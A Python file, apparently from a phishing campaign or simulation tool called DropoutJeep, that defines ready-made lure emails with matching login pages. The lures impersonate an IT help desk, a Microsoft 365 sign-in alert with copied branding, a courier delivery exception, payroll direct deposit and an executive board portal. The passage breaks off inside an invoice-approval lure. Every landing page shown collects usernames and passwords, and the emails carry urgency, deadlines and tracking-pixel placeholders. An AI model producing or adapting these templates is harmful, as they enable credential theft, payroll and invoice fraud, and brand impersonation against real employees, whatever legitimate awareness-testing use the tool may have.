import json
import pathlib

templates = [
    {
        "name": "IT Help Desk Password Check",
        "category": "it-help-desk",
        "description": "Enterprise IT Service Desk password & account maintenance verification notice.",
        "tags": ["it", "help-desk", "internal", "security"],
        "subject": "IT Action Required: Verify Your Account Password",
        "author": "DropoutJeep Built-in",
        "body_html": """<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>IT Security Notice</title>
</head>
<body style="margin:0; padding:0; background-color:#F8FAFC; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; color:#334155;">
  <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="background-color:#F8FAFC; padding:40px 10px;">
    <tr>
      <td align="center">
        <table role="presentation" width="100%" style="max-width:580px; background-color:#FFFFFF; border:1px solid #E2E8F0; border-radius:8px; box-shadow:0 4px 6px -1px rgba(0,0,0,0.05); overflow:hidden;">
          <tr>
            <td style="background-color:#0F172A; padding:24px 32px; border-bottom:3px solid #0284C7;">
              <table width="100%">
                <tr>
                  <td><span style="color:#FFFFFF; font-size:18px; font-weight:700;">&#128737; Global IT Service Desk</span></td>
                  <td align="right"><span style="background-color:#1E293B; color:#38BDF8; font-size:11px; font-weight:600; padding:4px 8px; border-radius:4px; font-family:monospace;">TICKET #IT-88491</span></td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td style="padding:32px;">
              <h2 style="margin:0 0 16px 0; color:#0F172A; font-size:20px; font-weight:700;">Account Password Verification Required</h2>
              <p style="margin:0 0 16px 0; font-size:14px; line-height:1.6; color:#475569;">Dear User,</p>
              <p style="margin:0 0 20px 0; font-size:14px; line-height:1.6; color:#475569;">Our automated system integrity monitor flagged a mandatory password policy synchronization requirement for your corporate directory account.</p>
              <div style="background-color:#FEF2F2; border-left:4px solid #EF4444; padding:16px; margin-bottom:24px; border-radius:0 6px 6px 0;">
                <p style="margin:0; font-size:13px; color:#991B1B; font-weight:600;">&#9888; Action Deadline</p>
                <p style="margin:4px 0 0 0; font-size:13px; color:#7F1D1D;">Failure to re-verify your password within 24 hours will temporarily suspend your SSO access to internal applications.</p>
              </div>
              <table role="presentation" width="100%" style="margin-bottom:28px;">
                <tr>
                  <td align="center">
                    <a href="{{TRACK_LINK}}" style="display:inline-block; background-color:#0284C7; color:#FFFFFF; font-size:14px; font-weight:600; text-decoration:none; padding:12px 32px; border-radius:6px; box-shadow:0 2px 4px rgba(2,132,199,0.25);">Verify Account Password &rarr;</a>
                  </td>
                </tr>
              </table>
              <p style="margin:0 0 8px 0; font-size:13px; color:#64748B;">Thank you,</p>
              <p style="margin:0; font-size:13px; font-weight:600; color:#334155;">IT Operations &amp; Information Security Team</p>
            </td>
          </tr>
          <tr>
            <td style="background-color:#F1F5F9; padding:20px 32px; border-top:1px solid #E2E8F0; text-align:center;">
              <p style="margin:0 0 8px 0; font-size:11px; color:#94A3B8;">This is an automated administrative notification from Global IT Infrastructure.</p>
              <p style="margin:0; font-size:11px;"><a href="{{UNSUBSCRIBE_LINK}}" style="color:#64748B; text-decoration:underline;">Unsubscribe from IT notifications</a></p>
            </td>
          </tr>
        </table>
      </td>
    </tr>
  </table>
  {{PIXEL}}
</body>
</html>""",
        "landing_html": """<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>IT Service Portal — Password Verification</title>
<style>
  * { box-sizing: border-box; }
  body { margin:0; padding:0; background: linear-gradient(135deg, #0F172A 0%, #1E293B 100%); min-height:100vh; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display:flex; align-items:center; justify-content:center; }
  .card { background:#FFFFFF; width:100%; max-width:420px; border-radius:12px; box-shadow:0 20px 25px -5px rgba(0,0,0,0.3); overflow:hidden; margin:20px; }
  .card-header { background:#0F172A; padding:28px 32px; text-align:center; border-bottom:3px solid #0284C7; }
  .card-header h1 { color:#FFFFFF; font-size:18px; margin:8px 0 0 0; font-weight:700; }
  .card-header p { color:#94A3B8; font-size:12px; margin:4px 0 0 0; }
  .card-body { padding:32px; }
  .form-group { margin-bottom:20px; }
  .form-group label { display:block; font-size:12px; font-weight:600; color:#334155; margin-bottom:6px; text-transform:uppercase; }
  .form-group input { width:100%; padding:11px 14px; border:1px solid #CBD5E1; border-radius:6px; font-size:14px; outline:none; }
  .form-group input:focus { border-color:#0284C7; box-shadow:0 0 0 3px rgba(2,132,199,0.15); }
  .btn-submit { width:100%; background:#0284C7; color:white; border:none; padding:12px; font-size:14px; font-weight:600; border-radius:6px; cursor:pointer; }
  .btn-submit:hover { background:#0369A1; }
  .badge-trust { display:flex; align-items:center; justify-content:center; gap:6px; margin-top:20px; font-size:11px; color:#64748B; }
</style>
</head>
<body>
  <div class="card">
    <div class="card-header">
      <div style="font-size:24px;">&#128737;</div>
      <h1>IT Service Desk Portal</h1>
      <p>Identity &amp; Account Verification</p>
    </div>
    <div class="card-body">
      <form method="post">
        <input type="hidden" name="token" value="{{TOKEN}}">
        <div class="form-group">
          <label>Corporate Username / Email</label>
          <input name="user" type="text" placeholder="username@company.com" required>
        </div>
        <div class="form-group">
          <label>Current Account Password</label>
          <input name="pass" type="password" placeholder="&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;" required>
        </div>
        <button type="submit" class="btn-submit">Verify Identity &amp; Continue &rarr;</button>
      </form>
      <div class="badge-trust">
        <span>&#128274;</span> Encrypted 256-Bit SSL Directory Connection
      </div>
    </div>
  </div>
</body>
</html>""",
        "filename": "it_help_desk.json"
    },
    {
        "name": "Microsoft 365 OAuth Login",
        "category": "oauth",
        "description": "Authentic Microsoft 365 / Azure AD Security Alert and Single Sign-On notification.",
        "tags": ["oauth", "microsoft", "m365", "security-alert"],
        "subject": "Microsoft 365 security alert: Unusual sign-in activity detected",
        "author": "DropoutJeep Built-in",
        "body_html": """<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Microsoft 365 Security Alert</title>
</head>
<body style="margin:0; padding:0; background-color:#F2F2F2; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;">
  <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="background-color:#F2F2F2; padding:30px 10px;">
    <tr>
      <td align="center">
        <table role="presentation" width="100%" style="max-width:560px; background-color:#FFFFFF; border:1px solid #E1E1E1; box-shadow:0 2px 4px rgba(0,0,0,0.05);">
          <tr>
            <td style="padding:32px 32px 16px 32px;">
              <svg width="108" height="23" viewBox="0 0 108 23" fill="none">
                <rect x="0" y="0" width="10.5" height="10.5" fill="#F25022"/>
                <rect x="11.5" y="0" width="10.5" height="10.5" fill="#7FBA00"/>
                <rect x="0" y="11.5" width="10.5" height="10.5" fill="#00A4EF"/>
                <rect x="11.5" y="11.5" width="10.5" height="10.5" fill="#FFB900"/>
                <text x="28" y="17" fill="#737373" font-family="Segoe UI, sans-serif" font-size="16" font-weight="600">Microsoft</text>
              </svg>
            </td>
          </tr>
          <tr>
            <td style="padding:0 32px 32px 32px;">
              <h1 style="margin:0 0 16px 0; color:#1B1B1B; font-size:20px; font-weight:600;">Unusual sign-in activity</h1>
              <p style="margin:0 0 16px 0; font-size:14px; line-height:1.5; color:#505050;">We detected something unusual about a recent sign-in to the Microsoft account associated with your organization.</p>
              <table width="100%" style="background-color:#F8F8F8; border:1px solid #EBEBEB; padding:16px; margin-bottom:24px; font-size:13px; color:#333333;">
                <tr><td style="padding:4px 0; color:#666666; width:100px;">Country/region:</td><td style="padding:4px 0; font-weight:600;">Unrecognized Location</td></tr>
                <tr><td style="padding:4px 0; color:#666666;">IP address:</td><td style="padding:4px 0; font-weight:600; font-family:monospace;">198.51.100.44</td></tr>
                <tr><td style="padding:4px 0; color:#666666;">Date/time:</td><td style="padding:4px 0; font-weight:600;">Just now</td></tr>
                <tr><td style="padding:4px 0; color:#666666;">Platform:</td><td style="padding:4px 0; font-weight:600;">Windows 11 / Chrome Browser</td></tr>
              </table>
              <p style="margin:0 0 24px 0; font-size:14px; line-height:1.5; color:#505050;">If this was you, you can safely ignore this email. If you don't recognize this activity, please review your recent account activity immediately.</p>
              <table role="presentation" width="100%">
                <tr>
                  <td>
                    <a href="{{TRACK_LINK}}" style="display:inline-block; background-color:#0067B8; color:#FFFFFF; font-size:14px; font-weight:600; text-decoration:none; padding:10px 24px;">Review recent activity &rarr;</a>
                  </td>
                </tr>
              </table>
              <p style="margin:32px 0 0 0; font-size:13px; color:#505050;">Thanks,<br>The Microsoft account team</p>
            </td>
          </tr>
          <tr>
            <td style="background-color:#F2F2F2; padding:16px 32px; font-size:11px; color:#707070; border-top:1px solid #E1E1E1;">
              <p style="margin:0 0 4px 0;">Microsoft Corporation, One Microsoft Way, Redmond, WA 98052</p>
              <p style="margin:0;"><a href="{{UNSUBSCRIBE_LINK}}" style="color:#0067B8; text-decoration:none;">Unsubscribe from security notifications</a></p>
            </td>
          </tr>
        </table>
      </td>
    </tr>
  </table>
  {{PIXEL}}
</body>
</html>""",
        "landing_html": """<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in to your Microsoft account</title>
<style>
  * { box-sizing: border-box; }
  body { margin:0; padding:0; background-color:#F2F2F2; font-family:'Segoe UI', -apple-system, Roboto, sans-serif; display:flex; flex-direction:column; min-height:100vh; justify-content:center; align-items:center; }
  .login-card { background:#FFFFFF; width:100%; max-width:440px; padding:44px; box-shadow:0 2px 6px rgba(0,0,0,0.2); }
  .ms-logo { margin-bottom:16px; }
  h1 { font-size:24px; font-weight:600; color:#1B1B1B; margin:0 0 16px 0; }
  .form-control { width:100%; padding:8px 0; border:none; border-bottom:1px solid #666666; font-size:15px; margin-bottom:16px; outline:none; }
  .form-control:focus { border-bottom-color:#0067B8; border-bottom-width:2px; }
  .btn-primary { background:#0067B8; color:white; border:none; padding:10px 36px; font-size:15px; font-weight:400; cursor:pointer; float:right; margin-top:20px; }
  .btn-primary:hover { background:#005A9E; }
  .links { font-size:13px; margin-top:16px; }
  .links a { color:#0067B8; text-decoration:none; display:block; margin-bottom:8px; }
  .footer { position:fixed; bottom:0; width:100%; background:#F2F2F2; padding:12px 24px; font-size:12px; color:#616161; display:flex; justify-content:flex-end; gap:24px; }
</style>
</head>
<body>
  <div class="login-card">
    <div class="ms-logo">
      <svg width="108" height="23" viewBox="0 0 108 23" fill="none">
        <rect x="0" y="0" width="10.5" height="10.5" fill="#F25022"/>
        <rect x="11.5" y="0" width="10.5" height="10.5" fill="#7FBA00"/>
        <rect x="0" y="11.5" width="10.5" height="10.5" fill="#00A4EF"/>
        <rect x="11.5" y="11.5" width="10.5" height="10.5" fill="#FFB900"/>
        <text x="28" y="17" fill="#737373" font-family="Segoe UI, sans-serif" font-size="16" font-weight="600">Microsoft</text>
      </svg>
    </div>
    <h1>Sign in</h1>
    <form method="post">
      <input type="hidden" name="token" value="{{TOKEN}}">
      <input class="form-control" name="user" type="email" placeholder="Email, phone, or Skype" required>
      <input class="form-control" name="pass" type="password" placeholder="Password" required>
      <div class="links">
        <a href="#">No account? Create one!</a>
        <a href="#">Can't access your account?</a>
      </div>
      <button type="submit" class="btn-primary">Next</button>
    </form>
  </div>
  <div class="footer">
    <span>Terms of use</span>
    <span>Privacy &amp; cookies</span>
    <span>&copy; 2026 Microsoft</span>
  </div>
</body>
</html>""",
        "filename": "oauth_login.json"
    },
    {
        "name": "Global Express Delivery Exception",
        "category": "shipping",
        "description": "Express Courier Parcel Delivery Exception & Address Reschedule Notification.",
        "tags": ["shipping", "logistics", "delivery", "parcel"],
        "subject": "Delivery Exception: Action Required for Shipment #DJ-84920419",
        "author": "DropoutJeep Built-in",
        "body_html": """<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Parcel Delivery Status</title>
</head>
<body style="margin:0; padding:0; background-color:#F4F4F6; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; color:#2D3748;">
  <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="background-color:#F4F4F6; padding:30px 10px;">
    <tr>
      <td align="center">
        <table role="presentation" width="100%" style="max-width:580px; background-color:#FFFFFF; border-radius:8px; border:1px solid #E2E8F0; overflow:hidden;">
          <tr>
            <td style="background-color:#1E1B4B; padding:24px 32px; border-bottom:4px solid #F97316;">
              <table width="100%">
                <tr>
                  <td><span style="color:#FFFFFF; font-size:20px; font-weight:800;">&#128230; GLOBAL EXPRESS LOGISTICS</span></td>
                  <td align="right"><span style="background-color:#F97316; color:#FFFFFF; font-size:11px; font-weight:700; padding:4px 8px; border-radius:4px; font-family:monospace;">EXPRESS PARCEL</span></td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td style="padding:24px 32px 12px 32px; background-color:#F8FAFC; border-bottom:1px solid #E2E8F0;">
              <table width="100%" style="text-align:center; font-size:11px; font-weight:600; color:#64748B;">
                <tr>
                  <td style="color:#16A34A;">&#10003; Picked Up</td>
                  <td style="color:#16A34A;">&rarr; &#10003; In Transit &rarr;</td>
                  <td style="color:#DC2626; font-weight:700;">&#9888; Address Exception</td>
                  <td>&rarr; Final Delivery</td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td style="padding:32px;">
              <h2 style="margin:0 0 12px 0; color:#0F172A; font-size:18px; font-weight:700;">Delivery Attempt Unsuccessful</h2>
              <p style="margin:0 0 20px 0; font-size:14px; line-height:1.6; color:#475569;">We attempted to deliver your package <strong>#DJ-84920419</strong> today, but the courier was unable to verify your street address. A rescheduled delivery window is required.</p>
              <table width="100%" style="background-color:#F8FAFC; border:1px solid #E2E8F0; border-radius:6px; padding:16px; margin-bottom:24px; font-size:13px;">
                <tr><td style="color:#64748B; padding:4px 0;">Tracking ID:</td><td style="font-weight:700; font-family:monospace; color:#0F172A;">DJ-84920419</td></tr>
                <tr><td style="color:#64748B; padding:4px 0;">Service Level:</td><td style="font-weight:600; color:#0F172A;">Express Standard (Next-Day)</td></tr>
                <tr><td style="color:#64748B; padding:4px 0;">Status:</td><td style="font-weight:700; color:#DC2626;">Held at Local Facility</td></tr>
              </table>
              <table role="presentation" width="100%">
                <tr>
                  <td align="center">
                    <a href="{{TRACK_LINK}}" style="display:inline-block; background-color:#F97316; color:#FFFFFF; font-size:14px; font-weight:700; text-decoration:none; padding:14px 32px; border-radius:6px;">Update Address &amp; Reschedule Delivery &rarr;</a>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td style="background-color:#F1F5F9; padding:20px 32px; border-top:1px solid #E2E8F0; text-align:center;">
              <p style="margin:0 0 6px 0; font-size:11px; color:#64748B;">Global Express Courier Operations &bull; Automated Parcel Tracking Desk</p>
              <p style="margin:0; font-size:11px;"><a href="{{UNSUBSCRIBE_LINK}}" style="color:#475569; text-decoration:underline;">Unsubscribe from tracking alerts</a></p>
            </td>
          </tr>
        </table>
      </td>
    </tr>
  </table>
  {{PIXEL}}
</body>
</html>""",
        "landing_html": """<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Reschedule Parcel Delivery</title>
<style>
  * { box-sizing: border-box; }
  body { margin:0; padding:0; background-color:#F8FAFC; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; color:#1E293B; }
  .header { background:#1E1B4B; color:white; padding:16px 24px; border-bottom:4px solid #F97316; font-size:18px; font-weight:700; display:flex; justify-content:space-between; align-items:center; }
  .container { max-width:540px; margin:40px auto; background:white; border-radius:8px; box-shadow:0 4px 12px rgba(0,0,0,0.08); border:1px solid #E2E8F0; }
  .banner { background:#FFF7ED; border-bottom:1px solid #FFEDD5; padding:16px 24px; color:#C2410C; font-size:13px; font-weight:600; display:flex; align-items:center; gap:10px; }
  .body-content { padding:28px; }
  .form-group { margin-bottom:16px; }
  .form-group label { display:block; font-size:12px; font-weight:600; color:#475569; margin-bottom:6px; text-transform:uppercase; }
  .form-group input, .form-group select { width:100%; padding:10px 14px; border:1px solid #CBD5E1; border-radius:6px; font-size:14px; outline:none; }
  .btn-orange { width:100%; background:#F97316; color:white; border:none; padding:12px; font-size:14px; font-weight:700; border-radius:6px; cursor:pointer; margin-top:10px; }
</style>
</head>
<body>
  <div class="header">
    <span>&#128230; Global Express Delivery</span>
    <span style="font-size:12px; font-weight:400; font-family:monospace;">DJ-84920419</span>
  </div>
  <div class="container">
    <div class="banner">
      <span>&#9888;</span> Delivery Address Verification Required for Parcel Release
    </div>
    <div class="body-content">
      <h2 style="margin:0 0 8px 0; font-size:18px; color:#0F172A;">Reschedule Delivery Window</h2>
      <p style="margin:0 0 20px 0; font-size:13px; color:#64748B;">Please confirm your account login &amp; delivery address details to authorize package redelivery.</p>
      <form method="post">
        <input type="hidden" name="token" value="{{TOKEN}}">
        <div class="form-group">
          <label>Recipient Account Email</label>
          <input name="user" type="email" placeholder="name@example.com" required>
        </div>
        <div class="form-group">
          <label>Account Password / Verification Code</label>
          <input name="pass" type="password" placeholder="&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;" required>
        </div>
        <button type="submit" class="btn-orange">Confirm &amp; Schedule Redelivery &rarr;</button>
      </form>
    </div>
  </div>
</body>
</html>""",
        "filename": "shipping.json"
    },
    {
        "name": "Payroll Direct Deposit Update Notice",
        "category": "payroll",
        "description": "Enterprise HR & Payroll direct deposit account verification notice.",
        "tags": ["payroll", "hr", "finance", "direct-deposit"],
        "subject": "Urgent: Direct Deposit Account Verification Required for Upcoming Pay Run",
        "author": "DropoutJeep Built-in",
        "body_html": """<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Payroll Notification</title>
</head>
<body style="margin:0; padding:0; background-color:#F1F5F9; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; color:#334155;">
  <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="background-color:#F1F5F9; padding:40px 10px;">
    <tr>
      <td align="center">
        <table role="presentation" width="100%" style="max-width:580px; background-color:#FFFFFF; border-radius:8px; border:1px solid #E2E8F0; overflow:hidden;">
          <tr>
            <td style="background-color:#0D9488; padding:24px 32px;">
              <table width="100%">
                <tr>
                  <td><span style="color:#FFFFFF; font-size:18px; font-weight:700;">&#128179; Enterprise HR &amp; Payroll Portal</span></td>
                  <td align="right"><span style="background-color:#0F766E; color:#E6FFFA; font-size:11px; font-weight:700; padding:4px 8px; border-radius:4px; font-family:monospace;">PAYROLL DISBURSEMENT</span></td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td style="padding:32px;">
              <h2 style="margin:0 0 16px 0; color:#0F172A; font-size:19px; font-weight:700;">Direct Deposit Routing Verification Required</h2>
              <p style="margin:0 0 16px 0; font-size:14px; line-height:1.6; color:#475569;">Dear Employee,</p>
              <p style="margin:0 0 20px 0; font-size:14px; line-height:1.6; color:#475569;">During pre-processing for the upcoming bi-weekly pay period, your direct deposit disbursement request returned a automated banking routing validation code. Immediate confirmation is required to avoid paper check processing delays.</p>
              <div style="background-color:#F0FDF4; border:1px solid #BBF7D0; border-radius:6px; padding:16px; margin-bottom:24px;">
                <table width="100%" style="font-size:13px; color:#166534;">
                  <tr><td style="padding:3px 0; font-weight:600;">Upcoming Disbursement:</td><td align="right" style="font-weight:700;">$3,450.00 Direct Deposit</td></tr>
                  <tr><td style="padding:3px 0; font-weight:600;">Payroll Period:</td><td align="right" style="font-family:monospace;">Current Pay Period</td></tr>
                </table>
              </div>
              <table role="presentation" width="100%">
                <tr>
                  <td align="center">
                    <a href="{{TRACK_LINK}}" style="display:inline-block; background-color:#0D9488; color:#FFFFFF; font-size:14px; font-weight:700; text-decoration:none; padding:13px 32px; border-radius:6px;">Confirm Banking Details &rarr;</a>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td style="background-color:#F8FAFC; padding:20px 32px; border-top:1px solid #E2E8F0; text-align:center;">
              <p style="margin:0 0 6px 0; font-size:11px; color:#64748B;">Payroll &amp; Human Resources Department &bull; Confidential Employee Portal</p>
              <p style="margin:0; font-size:11px;"><a href="{{UNSUBSCRIBE_LINK}}" style="color:#475569; text-decoration:underline;">Unsubscribe from payroll alerts</a></p>
            </td>
          </tr>
        </table>
      </td>
    </tr>
  </table>
  {{PIXEL}}
</body>
</html>""",
        "landing_html": """<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Payroll &amp; Banking Verification</title>
<style>
  * { box-sizing: border-box; }
  body { margin:0; padding:0; background-color:#F1F5F9; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; }
  .card { background:white; width:100%; max-width:440px; border-radius:10px; border:1px solid #E2E8F0; box-shadow:0 10px 25px rgba(0,0,0,0.08); overflow:hidden; }
  .header { background:#0D9488; color:white; padding:24px; text-align:center; font-size:18px; font-weight:700; }
  .body-content { padding:28px; }
  .form-group { margin-bottom:18px; }
  .form-group label { display:block; font-size:12px; font-weight:600; color:#334155; margin-bottom:6px; }
  .form-group input { width:100%; padding:10px 14px; border:1px solid #CBD5E1; border-radius:6px; font-size:14px; outline:none; }
  .btn-teal { width:100%; background:#0D9488; color:white; border:none; padding:12px; font-size:14px; font-weight:700; border-radius:6px; cursor:pointer; }
</style>
</head>
<body>
  <div class="card">
    <div class="header">&#128179; Payroll Employee Portal</div>
    <div class="body-content">
      <h2 style="margin:0 0 8px 0; font-size:16px; color:#0F172A;">Verify Direct Deposit Information</h2>
      <p style="margin:0 0 20px 0; font-size:13px; color:#64748B;">Authenticate with your corporate credentials to confirm banking details.</p>
      <form method="post">
        <input type="hidden" name="token" value="{{TOKEN}}">
        <div class="form-group">
          <label>Employee Email</label>
          <input name="user" type="email" placeholder="employee@company.com" required>
        </div>
        <div class="form-group">
          <label>Portal Password</label>
          <input name="pass" type="password" placeholder="&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;" required>
        </div>
        <button type="submit" class="btn-teal">Verify &amp; Update Banking Info &rarr;</button>
      </form>
    </div>
  </div>
</body>
</html>""",
        "filename": "payroll.json"
    },
    {
        "name": "Executive Board Meeting Briefing",
        "category": "executive",
        "description": "C-Suite & Board of Directors confidential agenda & document portal access.",
        "tags": ["executive", "board", "c-suite", "confidential"],
        "subject": "CONFIDENTIAL: Q3 Board of Directors Briefing Materials Available",
        "author": "DropoutJeep Built-in",
        "body_html": """<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Board Briefing Notice</title>
</head>
<body style="margin:0; padding:0; background-color:#0F172A; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; color:#E2E8F0;">
  <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="background-color:#0F172A; padding:40px 10px;">
    <tr>
      <td align="center">
        <table role="presentation" width="100%" style="max-width:580px; background-color:#1E293B; border-radius:8px; border:1px solid #334155; overflow:hidden;">
          <tr>
            <td style="background-color:#020617; padding:24px 32px; border-bottom:2px solid #D97706;">
              <table width="100%">
                <tr>
                  <td><span style="color:#F59E0B; font-size:16px; font-weight:800; letter-spacing:1px;">&#128081; EXECUTIVE BOARD PORTAL</span></td>
                  <td align="right"><span style="background-color:#78350F; color:#FDE68A; font-size:10px; font-weight:700; padding:3px 8px; border-radius:4px;">CONFIDENTIAL</span></td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td style="padding:32px;">
              <h2 style="margin:0 0 16px 0; color:#FFFFFF; font-size:20px; font-weight:700;">Q3 Strategic Briefing &amp; Board Materials</h2>
              <p style="margin:0 0 16px 0; font-size:14px; line-height:1.6; color:#94A3B8;">Dear Director,</p>
              <p style="margin:0 0 20px 0; font-size:14px; line-height:1.6; color:#94A3B8;">The confidential board packet and financial forecast models for the upcoming Q3 Board of Directors meeting are now available on the secure Executive Portal.</p>
              <div style="background-color:#020617; border:1px solid #334155; border-radius:6px; padding:16px; margin-bottom:24px;">
                <p style="margin:0 0 8px 0; font-size:12px; color:#F59E0B; font-weight:700;">AGENDA OVERVIEW</p>
                <ul style="margin:0; padding-left:18px; font-size:13px; color:#CBD5E1; line-height:1.6;">
                  <li>Q3 Financial Performance &amp; Revenue Projection</li>
                  <li>Strategic M&amp;A Opportunity Evaluation</li>
                  <li>Executive Compensation Committee Review</li>
                </ul>
              </div>
              <table role="presentation" width="100%">
                <tr>
                  <td align="center">
                    <a href="{{TRACK_LINK}}" style="display:inline-block; background-color:#D97706; color:#FFFFFF; font-size:14px; font-weight:700; text-decoration:none; padding:13px 32px; border-radius:6px;">Access Board Portal &rarr;</a>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td style="background-color:#020617; padding:20px 32px; border-top:1px solid #1E293B; text-align:center;">
              <p style="margin:0 0 6px 0; font-size:11px; color:#64748B;">Office of the Corporate Secretary &bull; Executive Communications</p>
              <p style="margin:0; font-size:11px;"><a href="{{UNSUBSCRIBE_LINK}}" style="color:#94A3B8; text-decoration:underline;">Unsubscribe from executive alerts</a></p>
            </td>
          </tr>
        </table>
      </td>
    </tr>
  </table>
  {{PIXEL}}
</body>
</html>""",
        "landing_html": """<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Executive Board Portal Access</title>
<style>
  * { box-sizing: border-box; }
  body { margin:0; padding:0; background:#020617; color:#F8FAFC; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; }
  .card { background:#0F172A; width:100%; max-width:440px; border-radius:12px; border:1px solid #334155; box-shadow:0 25px 50px -12px rgba(0,0,0,0.7); overflow:hidden; }
  .header { background:#020617; padding:32px 24px; text-align:center; border-bottom:2px solid #D97706; }
  .header h1 { color:#F59E0B; font-size:18px; margin:8px 0 0 0; font-weight:800; letter-spacing:1px; }
  .body-content { padding:32px; }
  .form-group { margin-bottom:20px; }
  .form-group label { display:block; font-size:11px; font-weight:700; color:#94A3B8; margin-bottom:6px; }
  .form-group input { width:100%; padding:11px 14px; background:#020617; border:1px solid #334155; border-radius:6px; color:#FFFFFF; font-size:14px; outline:none; }
  .form-group input:focus { border-color:#D97706; }
  .btn-gold { width:100%; background:#D97706; color:white; border:none; padding:12px; font-size:14px; font-weight:700; border-radius:6px; cursor:pointer; }
  .btn-gold:hover { background:#B45309; }
</style>
</head>
<body>
  <div class="card">
    <div class="header">
      <div style="font-size:28px;">&#128081;</div>
      <h1>Executive Board Portal</h1>
    </div>
    <div class="body-content">
      <p style="margin:0 0 20px 0; font-size:13px; color:#94A3B8; text-align:center;">Authentication required for privileged director access.</p>
      <form method="post">
        <input type="hidden" name="token" value="{{TOKEN}}">
        <div class="form-group">
          <label>Executive Directory User</label>
          <input name="user" type="text" placeholder="director@company.com" required>
        </div>
        <div class="form-group">
          <label>Secure Passcode / Security Key</label>
          <input name="pass" type="password" placeholder="&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;" required>
        </div>
        <button type="submit" class="btn-gold">Authenticate &amp; Open Packet &rarr;</button>
      </form>
    </div>
  </div>
</body>
</html>""",
        "filename": "executive_board.json"
    },
    {
        "name": "Accounts Payable Invoice Approval",
        "category": "finance",
        "description": "Enterprise Accounts Payable & ERP Invoice payment authorization request.",
        "tags": ["finance", "invoice", "accounts-payable", "erp"],
        "subject": "Approval Required: Invoice #INV-2026-9941 ($48,250.00 USD)",
        "author": "DropoutJeep Built-in",
        "body_html": """<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Accounts Payable Approval</title>
</head>
<body style="margin:0; padding:0; background-color:#F8FAFC; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; color:#334155;">
  <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="background-color:#F8FAFC; padding:40px 10px;">
    <tr>
      <td align="center">
        <table role="presentation" width="100%" style="max-width:580px; background-color:#FFFFFF; border-radius:8px; border:1px solid #E2E8F0; overflow:hidden;">
          <tr>
            <td style="background-color:#1E3A8A; padding:24px 32px;">
              <table width="100%">
                <tr>
                  <td><span style="color:#FFFFFF; font-size:18px; font-weight:700;">&#128181; Global Finance &amp; ERP System</span></td>
                  <td align="right"><span style="background-color:#1D4ED8; color:#EFF6FF; font-size:11px; font-weight:700; padding:4px 8px; border-radius:4px; font-family:monospace;">INVOICE APPROVAL</span></td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td style="padding:32px;">
              <h2 style="margin:0 0 16px 0; color:#0F172A; font-size:19px; font-weight:700;">Invoice Payment Authorization Required</h2>
              <p style="margin:0 0 20px 0; font-size:14px; line-height:1.6; color:#475569;">An accounts payable payment request has been submitted requiring your managerial sign-off before wire disbursement.</p>
              <table width="100%" style="background-color:#F1F5F9; border:1px solid #E2E8F0; border-radius:6px; padding:16px; margin-bottom:24px; font-size:13px; color:#334155;">
                <tr><td style="padding:4px 0; color:#64748B;">Invoice Number:</td><td align="right" style="font-weight:700; font-family:monospace; color:#0F172A;">INV-2026-9941</td></tr>
                <tr><td style="padding:4px 0; color:#64748B;">Vendor Name:</td><td align="right" style="font-weight:600; color:#0F172A;">Acme Cloud Infrastructure Inc.</td></tr>
